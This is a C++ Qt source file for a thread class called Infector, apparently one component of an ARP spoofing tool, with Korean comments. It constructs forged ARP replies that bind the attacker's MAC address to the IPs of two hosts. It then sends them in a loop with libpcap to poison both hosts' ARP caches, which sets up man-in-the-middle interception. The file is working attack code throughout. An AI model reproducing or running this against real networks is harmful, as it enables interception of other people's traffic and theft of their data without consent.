#include "infector.h"
#include "pcap.h"

Infector::Infector(const IpFlow& flow, QObject* parent)
    : QThread(parent), flow(flow)
{
    if (flow.handle == nullptr) {
        fprintf(stderr, "[ERROR] Infector: handle is null\n");
        return;
    }

    senderInfectionPacket.eth_.dmac_ = flow.sender_mac;
    senderInfectionPacket.eth_.smac_ = flow.my_mac;
    senderInfectionPacket.eth_.type_ = htons(EthHdr::Arp);

    senderInfectionPacket.arp_.hrd_ = htons(ArpHdr::ETHER);
    senderInfectionPacket.arp_.pro_ = htons(EthHdr::Ip4);
    senderInfectionPacket.arp_.hln_ = Mac::Size;
    senderInfectionPacket.arp_.pln_ = Ip::Size;
    senderInfectionPacket.arp_.op_ = htons(ArpHdr::Reply);
    senderInfectionPacket.arp_.smac_ = flow.my_mac;
    senderInfectionPacket.arp_.sip_ = htonl(flow.target_ip);
    senderInfectionPacket.arp_.tmac_ = flow.sender_mac;
    senderInfectionPacket.arp_.tip_ = htonl(flow.sender_ip);

    targetInfectionPacket.eth_.dmac_ = flow.target_mac;
    targetInfectionPacket.eth_.smac_ = flow.my_mac;
    targetInfectionPacket.eth_.type_ = htons(EthHdr::Arp);

    targetInfectionPacket.arp_.hrd_ = htons(ArpHdr::ETHER);
    targetInfectionPacket.arp_.pro_ = htons(EthHdr::Ip4);
    targetInfectionPacket.arp_.hln_ = Mac::Size;
    targetInfectionPacket.arp_.pln_ = Ip::Size;
    targetInfectionPacket.arp_.op_ = htons(ArpHdr::Reply);
    targetInfectionPacket.arp_.smac_ = flow.my_mac;
    targetInfectionPacket.arp_.sip_ = htonl(flow.sender_ip);
    targetInfectionPacket.arp_.tmac_ = flow.target_mac;
    targetInfectionPacket.arp_.tip_ = htonl(flow.target_ip);
}

Infector::~Infector() {
    killTrigger();
    wait(); // 안전 종료
    emit logMessage("[Infector] 스레드 종료");
}

void Infector::trigger() {
    mutex.lock();
    triggered = true;
    cond.wakeOne();
    mutex.unlock();
}

void Infector::killTrigger() {
    mutex.lock();
    running = false;
    cond.wakeOne();
    mutex.unlock();
}

void Infector::run() {
    emit logMessage("[Infector] 스레드 시작");

    while (running) {
        mutex.lock();
        cond.wait(&mutex, 1000); // 3초 대기 or trigger 깨움

        if (!running) {
            mutex.unlock();
            break;
        }

        if (triggered) {
            triggered = false;
            sendInfection(InfectTarget::Sender);
        } else {
            // 주기 감염
            sendInfection(InfectTarget::Sender);
            sendInfection(InfectTarget::Target);
        }

        mutex.unlock();
    }
}

void Infector::sendInfection(InfectTarget target) {
    EthArpPacket* packet = nullptr;
    if (target == InfectTarget::Sender) {
        packet = &senderInfectionPacket;
    } else {
        packet = &targetInfectionPacket;
    };

    int res = pcap_sendpacket(flow.handle, reinterpret_cast<const u_char*>(packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "[ERROR] pcap_sendpacket return %d error=%s\n", res, pcap_geterr(flow.handle));
    }
}
